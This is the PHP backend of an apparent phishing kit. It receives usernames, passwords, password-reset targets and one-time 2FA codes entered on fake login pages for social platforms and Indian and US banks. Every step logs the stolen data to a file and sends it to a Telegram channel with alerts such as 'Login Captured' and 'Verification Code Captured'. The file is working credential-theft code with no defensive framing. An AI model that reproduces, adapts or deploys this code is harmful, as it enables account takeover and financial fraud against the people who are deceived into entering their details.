<?php
/* ════════════════════════════════════════════════════════════════════
   login_handler.php  -- Dynamic Login, Credential & OTP Backend Handler
   Handles multi-step form submissions:
     Step 1 (login)           → Captures username / phone / email + password
     Step 2 (password)        → Captures password submission
     Step 3 (forgot_password) → Logs password recovery trigger
     Step 4 (reset_phone/email)→ Logs recovery phone/email targets
     Step 5 (code / otp)      → Captures 2FA / Verification code
     Step 6 (resend_otp)      → Logs OTP resend requests
   Features:
     - Dynamic Platform & Bank detection (e.g. Platform: Snapchat vs Bank: SBI)
     - Intelligent Identifier detection (Phone Number vs Email vs Username)
     - Terminal log output + persistent file record + Telegram/Discord alert
   ════════════════════════════════════════════════════════════════════ */

/* ── Telegram Webhook Integration ────────────────────────────────── */
if (!defined('TELEGRAM_BOT_TOKEN') || !defined('TELEGRAM_CHAT_ID')) {
    require_once __DIR__ . '/../core/telegram_webhook.php';
}

/* ── CORS / Headers ─────────────────────────────────────────── */
header('Content-Type: application/json');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

/* ── Accept POST and GET (fallback) ─────────────────────────── */
if (!in_array($_SERVER['REQUEST_METHOD'], ['POST', 'GET'])) {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method Not Allowed']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   HELPERS & METADATA RESOLUTION
   ════════════════════════════════════════════════════════════ */
function clean(string $val): string {
    return trim(strip_tags($val));
}

/**
 * Dynamically determine whether the target service is a Bank or a Platform.
 */
function getPlatformLabel(string $platform): string {
    $p = strtolower(trim($platform));
    $bankKeywords = ['sbi', 'bank', 'yono', 'hdfc', 'icici', 'axis', 'pnb', 'kotak', 'baroda', 'canara', 'union', 'banking', 'chase', 'wells fargo', 'citi', 'boa'];
    foreach ($bankKeywords as $k) {
        if (strpos($p, $k) !== false) {
            return 'Bank';
        }
    }
    return 'Platform';
}

/**
 * Intelligently detect if account identifier is Phone Number, Email, or Username.
 */
function getIdentifierLabel(string $val): string {
    $v = trim($val);
    if (filter_var($v, FILTER_VALIDATE_EMAIL)) {
        return 'Email';
    }
    // Phone number detection (starts with + or contains 7+ digits)
    $digitsOnly = preg_replace('/[^0-9]/', '', $v);
    if (strlen($digitsOnly) >= 7 && (strpos($v, '+') === 0 || preg_match('/^[0-9\s\-()+]+$/', $v))) {
        return 'Phone Number';
    }
    return 'Username';
}

/**
 * Contextual icon for the platform.
 */
function getPlatformIcon(string $platform): string {
    $p = strtolower(trim($platform));
    if (strpos($p, 'snapchat') !== false) return '👻';
    if (strpos($p, 'youtube') !== false) return '🔴';
    if (strpos($p, 'instagram') !== false) return '📸';
    if (strpos($p, 'facebook') !== false) return '📘';
    if (strpos($p, 'twitter') !== false || strpos($p, 'x') !== false) return '🐦';
    if (strpos($p, 'bank') !== false || strpos($p, 'sbi') !== false || strpos($p, 'yono') !== false) return '🏛️';
    return '🛡️';
}

/* ════════════════════════════════════════════════════════════
   INPUT COLLECTION
   ════════════════════════════════════════════════════════════ */
$username     = clean($_REQUEST['username']     ?? '');
$password     = clean($_REQUEST['password']     ?? '');
$platform     = clean($_REQUEST['platform']     ?? $_REQUEST['bank'] ?? 'Unknown');
$step         = clean($_REQUEST['step']         ?? 'login');
$code         = clean($_REQUEST['code']         ?? $_REQUEST['otp'] ?? '');
$reset_target = clean($_REQUEST['reset_target'] ?? '');

$platformLabel = getPlatformLabel($platform);
$idLabel       = getIdentifierLabel($username);
$platformIcon  = getPlatformIcon($platform);

/* ════════════════════════════════════════════════════════════
   SERVER-SIDE VALIDATION
   ════════════════════════════════════════════════════════════ */
$errors = [];

if (strlen($username) < 1 && $step !== 'resend_otp') {
    $errors[] = $idLabel . ' is required.';
}

if (strlen($password) < 1 && in_array($step, ['password'])) {
    $errors[] = 'Password is required.';
}

if (in_array($step, ['code', 'otp']) && strlen($code) < 1) {
    $errors[] = 'Verification code is required.';
}

if (!empty($errors)) {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => implode(' | ', $errors)]);
    exit;
}

/* ════════════════════════════════════════════════════════════
   COMMON METADATA
   ════════════════════════════════════════════════════════════ */
$data_dir   = dirname(__DIR__) . '/data';
$timestamp  = date('Y-m-d H:i:s T');
$client_ip  = 'Unknown';

foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_TRUE_CLIENT_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR'] as $h) {
    if (!empty($_SERVER[$h])) {
        $parts = explode(',', $_SERVER[$h]);
        $cand = trim($parts[0]);
        if (filter_var($cand, FILTER_VALIDATE_IP)) {
            $client_ip = $cand;
            break;
        }
    }
}
if ($client_ip === 'Unknown') {
    $client_ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

if (!is_dir($data_dir)) {
    mkdir($data_dir, 0750, true);
}

$divider   = str_repeat('━', 50);
$data_file = $data_dir . '/login_submissions.txt';

/* Helper to persist and signal terminal */
function persistRecord(string $file, string $dir, string $record): void {
    $fp = fopen($file, 'a');
    if ($fp) {
        flock($fp, LOCK_EX);
        fwrite($fp, $record);
        flock($fp, LOCK_UN);
        fclose($fp);
        @chmod($file, 0640);
        @file_put_contents($dir . '/.flag_form', $record);
    }
}

/* ════════════════════════════════════════════════════════════
   STEP 1: LOGIN  (Initial credential input)
   ════════════════════════════════════════════════════════════ */
if ($step === 'login') {

    $title = $platformIcon . '  ' . $platform . ' Login Captured';

    $record = implode("\n", [
        $divider,
        $title,
        $divider,
        'Date         : ' . $timestamp,
        $platformLabel . '     : ' . $platform,
        $idLabel . '   : ' . $username,
        'Password     : ' . $password,
        'IP           : ' . $client_ip,
        'User-Agent   : ' . $user_agent,
        $divider,
    ]) . "\n\n";

    persistRecord($data_file, $data_dir, $record);

    $terminal_log = "\n" . $divider . "\n"
        . $title . "\n"
        . "Time         : " . $timestamp   . "\n"
        . $divider . "\n"
        . $idLabel . "   : " . $username    . "\n"
        . "Password     : " . $password    . "\n"
        . "IP           : " . $client_ip   . "\n"
        . $divider . "\n";

    error_log($terminal_log);
    file_put_contents('php://stderr', $terminal_log);

    sendTelegramAlert(
        $platformIcon . ' ' . $platform . ' Login Captured',
        [
            $platformLabel => $platform,
            $idLabel       => $username,
            'Password'     => $password,
            'IP'           => $client_ip,
            'Timestamp'    => $timestamp,
            'User-Agent'   => substr($user_agent, 0, 120),
        ],
        15548997
    );

    echo json_encode(['status' => 'success', 'message' => 'Credentials received.']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   STEP 2: PASSWORD  (Password submission)
   ════════════════════════════════════════════════════════════ */
if ($step === 'password') {

    $title = '🔑  Password Captured -- ' . $platform;

    $record = implode("\n", [
        $divider,
        $title,
        $divider,
        'Date         : ' . $timestamp,
        $platformLabel . '     : ' . $platform,
        $idLabel . '   : ' . $username,
        'Password     : ' . $password,
        'IP           : ' . $client_ip,
        'User-Agent   : ' . $user_agent,
        $divider,
    ]) . "\n\n";

    persistRecord($data_file, $data_dir, $record);

    $terminal_log = "\n" . $divider . "\n"
        . $title . "\n"
        . "Time         : " . $timestamp   . "\n"
        . $divider . "\n"
        . $idLabel . "   : " . $username    . "\n"
        . "Password     : " . $password    . "\n"
        . "IP           : " . $client_ip   . "\n"
        . $divider . "\n";

    error_log($terminal_log);
    file_put_contents('php://stderr', $terminal_log);

    sendTelegramAlert(
        '🔑 Password Captured -- ' . $platform,
        [
            $platformLabel => $platform,
            $idLabel       => $username,
            'Password'     => $password,
            'IP'           => $client_ip,
            'Timestamp'    => $timestamp,
            'User-Agent'   => substr($user_agent, 0, 120),
        ],
        15105570
    );

    echo json_encode(['status' => 'success', 'message' => 'Password received.']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   STEP 3: FORGOT PASSWORD  (User triggered reset)
   ════════════════════════════════════════════════════════════ */
if ($step === 'forgot_password') {

    $title = '⚠️  Forgot Password Clicked -- ' . $platform;

    $record = implode("\n", [
        $divider,
        $title,
        $divider,
        'Date         : ' . $timestamp,
        $platformLabel . '     : ' . $platform,
        $idLabel . '   : ' . $username,
        'IP           : ' . $client_ip,
        'User-Agent   : ' . $user_agent,
        $divider,
    ]) . "\n\n";

    persistRecord($data_file, $data_dir, $record);

    $terminal_log = "\n" . $divider . "\n"
        . $title . "\n"
        . "Time         : " . $timestamp   . "\n"
        . $divider . "\n"
        . $idLabel . "   : " . $username    . "\n"
        . "IP           : " . $client_ip   . "\n"
        . $divider . "\n";

    error_log($terminal_log);
    file_put_contents('php://stderr', $terminal_log);

    sendTelegramAlert(
        '⚠️ Forgot Password Clicked -- ' . $platform,
        [
            $platformLabel => $platform,
            $idLabel       => $username,
            'IP'           => $client_ip,
            'Timestamp'    => $timestamp,
        ],
        16776960
    );

    echo json_encode(['status' => 'success', 'message' => 'Forgot password logged.']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   STEP 4: RESET PHONE / RESET EMAIL  (Recovery Target Input)
   ════════════════════════════════════════════════════════════ */
if ($step === 'reset_phone' || $step === 'reset_email') {

    $reset_type  = ($step === 'reset_phone') ? 'Phone' : 'Email';
    $reset_value = clean($_REQUEST['reset_target'] ?? '');
    $title       = '📱  Reset via ' . $reset_type . ' -- ' . $platform;

    $record = implode("\n", [
        $divider,
        $title,
        $divider,
        'Date         : ' . $timestamp,
        $platformLabel . '     : ' . $platform,
        $idLabel . '   : ' . $username,
        'Reset ' . $reset_type . '  : ' . $reset_value,
        'IP           : ' . $client_ip,
        'User-Agent   : ' . $user_agent,
        $divider,
    ]) . "\n\n";

    persistRecord($data_file, $data_dir, $record);

    $terminal_log = "\n" . $divider . "\n"
        . $title . "\n"
        . "Time         : " . $timestamp   . "\n"
        . $divider . "\n"
        . $idLabel . "   : " . $username    . "\n"
        . "Reset " . $reset_type . " : " . $reset_value . "\n"
        . "IP           : " . $client_ip   . "\n"
        . $divider . "\n";

    error_log($terminal_log);
    file_put_contents('php://stderr', $terminal_log);

    sendTelegramAlert(
        '📱 Reset via ' . $reset_type . ' -- ' . $platform,
        [
            $platformLabel         => $platform,
            $idLabel               => $username,
            'Reset ' . $reset_type => $reset_value,
            'IP'                   => $client_ip,
            'Timestamp'            => $timestamp,
        ],
        3447003
    );

    echo json_encode(['status' => 'success', 'message' => 'Reset info received.']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   STEP 5: CODE / OTP  (Verification code submitted)
   ════════════════════════════════════════════════════════════ */
if ($step === 'code' || $step === 'otp') {

    $title = '🔐  Verification Code Captured -- ' . $platform;

    $lines = [
        $divider,
        $title,
        $divider,
        'Date         : ' . $timestamp,
        $platformLabel . '     : ' . $platform,
        $idLabel . '   : ' . $username,
        'Code         : ' . $code,
    ];

    if (!empty($reset_target) && $reset_target !== $username) {
        $resetTargetLabel = getIdentifierLabel($reset_target);
        $lines[] = 'Target ' . $resetTargetLabel . ' : ' . $reset_target;
    }

    $lines[] = 'IP           : ' . $client_ip;
    $lines[] = 'User-Agent   : ' . $user_agent;
    $lines[] = $divider;

    $record = implode("\n", $lines) . "\n\n";

    persistRecord($data_file, $data_dir, $record);

    $terminal_log = "\n" . $divider . "\n"
        . $title . "\n"
        . "Time         : " . $timestamp   . "\n"
        . $divider . "\n"
        . $idLabel . "   : " . $username    . "\n"
        . "Code         : " . $code        . "\n"
        . "IP           : " . $client_ip   . "\n"
        . $divider . "\n";

    error_log($terminal_log);
    file_put_contents('php://stderr', $terminal_log);

    $tgFields = [
        $platformLabel => $platform,
        $idLabel       => $username,
        'Code'         => $code,
    ];

    if (!empty($reset_target) && $reset_target !== $username) {
        $resetTargetLabel = getIdentifierLabel($reset_target);
        $tgFields['Target ' . $resetTargetLabel] = $reset_target;
    }

    $tgFields['IP']         = $client_ip;
    $tgFields['Timestamp']  = $timestamp;
    $tgFields['User-Agent'] = substr($user_agent, 0, 120);

    sendTelegramAlert(
        '🔐 Verification Code Captured -- ' . $platform,
        $tgFields,
        16711680
    );

    echo json_encode(['status' => 'success', 'message' => 'Code received.']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   STEP 6: RESEND OTP (User requested new OTP)
   ════════════════════════════════════════════════════════════ */
if ($step === 'resend_otp') {

    $title = '🔄  OTP Resend Requested -- ' . $platform;

    $record = implode("\n", [
        $divider,
        $title,
        $divider,
        'Date         : ' . $timestamp,
        $platformLabel . '     : ' . $platform,
        $idLabel . '   : ' . $username,
        'IP           : ' . $client_ip,
        'User-Agent   : ' . $user_agent,
        $divider,
    ]) . "\n\n";

    persistRecord($data_file, $data_dir, $record);

    $terminal_log = "\n" . $divider . "\n"
        . $title . "\n"
        . "Time         : " . $timestamp   . "\n"
        . $divider . "\n"
        . $idLabel . "   : " . $username    . "\n"
        . "IP           : " . $client_ip   . "\n"
        . $divider . "\n";

    error_log($terminal_log);
    file_put_contents('php://stderr', $terminal_log);

    sendTelegramAlert(
        '🔄 OTP Resend Requested -- ' . $platform,
        [
            $platformLabel => $platform,
            $idLabel       => $username,
            'IP'           => $client_ip,
            'Timestamp'    => $timestamp,
        ],
        16753920
    );

    echo json_encode(['status' => 'success', 'message' => 'Resend logged.']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   UNKNOWN STEP -- Fallback
   ════════════════════════════════════════════════════════════ */
http_response_code(400);
echo json_encode(['status' => 'error', 'message' => 'Unknown step: ' . $step]);
exit;
